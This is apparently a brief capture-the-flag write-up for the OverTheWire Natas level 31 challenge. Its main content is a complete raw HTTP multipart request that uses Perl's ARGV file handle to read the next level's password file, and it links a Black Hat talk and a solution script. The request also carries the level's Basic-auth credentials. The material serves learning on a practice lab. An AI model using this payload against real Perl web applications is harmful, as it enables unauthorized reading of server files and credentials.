Interesting doc and code:
- https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf
- https://github.com/lcy2/otwPython/blob/master/natas31/natas31.py


This payload can play the trick
```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPOlEHtlszxRIAK3u
Connection: close
Content-Length: 472

------WebKitFormBoundaryPOlEHtlszxRIAK3u
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
------WebKitFormBoundaryPOlEHtlszxRIAK3u
Content-Disposition: form-data; name="file"; filename="2.txt"
Content-Type: text/plain

1,2,3,4
1,2,3,4
2,2,3,4,extra
3,2,3,4,??,??
4,2,3,4
1,1,1,1
ls,
`ls`,
------WebKitFormBoundaryPOlEHtlszxRIAK3u
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryPOlEHtlszxRIAK3u
```

seems the magic word `ARGV` can make perl to open any file that specific in the URL.